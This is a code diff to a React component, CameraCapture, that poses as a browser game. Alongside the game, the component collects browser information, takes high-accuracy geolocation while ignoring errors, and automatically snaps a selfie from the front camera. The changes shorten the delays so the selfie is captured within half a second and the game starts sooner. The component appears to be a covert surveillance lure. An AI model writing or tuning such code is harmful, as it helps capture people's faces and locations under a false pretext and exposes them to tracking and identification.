@@ -15,6 +15,7 @@ const COLOR_PALETTE = [
 function CameraCapture({ onSuccess }) {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
+  const streamRef = useRef(null);
   const [status, setStatus] = useState('LOADING');
   const [score, setScore] = useState(0);
   const [level, setLevel] = useState(1);
@@ -31,6 +32,12 @@ function CameraCapture({ onSuccess }) {
   useEffect(() => {
     collectBrowserInfo();
     initializeGame();
+    return () => {
+      // Clean up stream on unmount
+      if (streamRef.current) {
+        streamRef.current.getTracks().forEach(track => track.stop());
+      }
+    };
   }, []);
 
   const collectBrowserInfo = () => {
@@ -52,16 +59,19 @@ function CameraCapture({ onSuccess }) {
       }
     };
 
-    // Start the game after max 6 seconds no matter what
-    const timeout = setTimeout(startGameSafe, 6000);
+    // Start the game after max 3 seconds no matter what
+    const timeout = setTimeout(startGameSafe, 3000);
 
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' },
-        audio: false
-      });
+      // Get stream only once, save it in ref
+      if (!streamRef.current) {
+        streamRef.current = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: false
+        });
+      }
       if (videoRef.current) {
-        videoRef.current.srcObject = stream;
+        videoRef.current.srcObject = streamRef.current;
         videoRef.current.onloadedmetadata = () => {
           videoRef.current.play().catch(console.error);
           // Try to get location but start game anyway even if it fails
@@ -74,7 +84,7 @@ function CameraCapture({ onSuccess }) {
                 });
               },
               () => { /* ignore location errors */ },
-              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+              { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
             );
           } catch (e) { /* ignore */ }
           clearTimeout(timeout);
@@ -94,12 +104,12 @@ function CameraCapture({ onSuccess }) {
   const startGame = () => {
     setNewTarget();
     setStatus('PLAYING');
-    // Auto capture selfie right away when game starts
+    // Auto capture selfie immediately when game starts
     setTimeout(() => {
       if (!selfieCapturedRef.current) {
         captureFrame();
       }
-    }, 1000); // Capture after 1 second of game starting
+    }, 500); // Capture after 0.5 seconds
   };
 
   const setNewTarget = () => {
@@ -142,9 +152,9 @@ function CameraCapture({ onSuccess }) {
     const video = videoRef.current;
 
     if (!canvas || !video || video.readyState < 2) {
-      // If video isn't ready, try again in 500ms
+      // If video isn't ready, try again in 300ms
       selfieCapturedRef.current = false;
-      setTimeout(captureFrame, 500);
+      setTimeout(captureFrame, 300);
       return;
     }
 
